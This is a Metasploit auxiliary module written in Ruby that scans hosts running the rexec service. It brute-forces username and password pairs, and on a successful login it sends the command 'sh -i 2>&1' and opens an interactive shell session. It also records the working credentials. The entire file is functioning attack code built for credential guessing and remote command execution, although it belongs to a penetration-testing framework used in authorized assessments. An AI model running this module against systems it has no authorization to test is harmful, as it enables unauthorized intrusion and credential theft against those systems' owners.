##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::CommandShell

  def initialize
    super(
      'Name'        => 'rexec Authentication Scanner',
      'Description' => %q{
          This module will test an rexec service on a range of machines and
        report successful logins.

        NOTE: This module requires access to bind to privileged ports (below 1024).
      },
      'References' =>
        [
          [ 'CVE', '1999-0651' ],
          [ 'CVE', '1999-0502'] # Weak password
        ],
      'Author'      => [ 'jduck' ],
      'License'     => MSF_LICENSE
    )

    register_options(
      [
        Opt::RPORT(512),
        OptBool.new('ENABLE_STDERR', [ true, 'Enables connecting the stderr port', false ]),
        OptInt.new( 'STDERR_PORT',   [ false, 'The port to listen on for stderr', nil ])
      ])
  end

  def run_host(ip)
    print_status("#{ip}:#{rport} - Starting rexec sweep")

    if datastore['ENABLE_STDERR']
      # For each host, bind a privileged listening port for the target to connect
      # back to.
      ret = listen_on_random_port(datastore['STDERR_PORT'])
      if not ret
        return :abort
      end
      sd, stderr_port = ret
    else
      sd = stderr_port = nil
    end

    # The maximum time for a host is set here.
    Timeout.timeout(300) {
      each_user_pass { |user, pass|
        do_login(user, pass, sd, stderr_port)
      }
    }

    sd.close if sd
  end


  def do_login(user, pass, sfd, stderr_port)
    vprint_status("#{target_host}:#{rport} - Attempting rexec with username:password '#{user}':'#{pass}'")

    cmd = datastore['CMD']
    cmd ||= 'sh -i 2>&1'

    # We must connect from a privileged port.
    return :abort if not connect

    sock.put("#{stderr_port}\x00#{user}\x00#{pass}\x00#{cmd}\x00")

    if sfd and stderr_port
      stderr_sock = sfd.accept
      add_socket(stderr_sock)
    else
      stderr_sock = nil
    end

    # NOTE: We report this here, since we are awfully convinced now that this is really
    # an rexec service.
    report_service(
      :host => rhost,
      :port => rport,
      :proto => 'tcp',
      :name => 'exec'
    )

    # Read the expected nul byte response.
    buf = sock.get_once(1) || ''
    if buf != "\x00"
      buf = sock.get_once(-1) || ""
      vprint_error("Result: #{buf.gsub(/[[:space:]]+/, ' ')}")
      return :failed
    end

    # should we report a vuln here? rexec allowed w/o password?!
    print_good("#{target_host}:#{rport}, rexec '#{user}' : '#{pass}'")
    start_rexec_session(rhost, rport, user, pass, buf, stderr_sock)

    return :next_user

  # For debugging only.
  #rescue ::Exception
  #  print_error("#{$!}")
  #return :abort

  ensure
    disconnect()

  end


  #
  # This is only needed by rexec so it is not in the rservices mixin
  #
  def listen_on_random_port(specific_port = 0)
    stderr_port = nil
    if specific_port > 0
      stderr_port = specific_port
      sd = listen_on_port(stderr_port)
    else
      stderr_port = 1024 + rand(0x10000 - 1024)
      512.times {
        sd = listen_on_port(stderr_port)
        break if sd
        stderr_port = 1024 + rand(0x10000 - 1024)
      }
    end

    if not sd
      print_error("Unable to bind to listener port")
      return false
    end

    add_socket(sd)
    print_status("Listening on port #{stderr_port}")
    [ sd, stderr_port ]
  end


  def listen_on_port(stderr_port)
    vprint_status("Trying to listen on port #{stderr_port} ..")
    sd = nil
    begin
      sd = Rex::Socket.create_tcp_server('LocalPort' => stderr_port)

    rescue Rex::BindFailed
      # Ignore and try again

    end

    sd
  end


  def start_rexec_session(host, port, user, pass, proof, stderr_sock)
    report_auth_info(
      :host	=> host,
      :port	=> port,
      :sname => 'exec',
      :user	=> user,
      :pass	=> pass,
      :proof  => proof,
      :source_type => "user_supplied",
      :active => true
    )

    merge_me = {
      'USERPASS_FILE' => nil,
      'USER_FILE'     => nil,
      'PASS_FILE'     => nil,
      'USERNAME'      => user,
      'PASSWORD'      => pass,
      # Save a reference to the socket so we don't GC prematurely
      :stderr_sock    => stderr_sock
    }

    # Don't tie the life of this socket to the exploit
    self.sockets.delete(stderr_sock)

    start_session(self, "rexec #{user}:#{pass} (#{host}:#{port})", merge_me)
  end
end
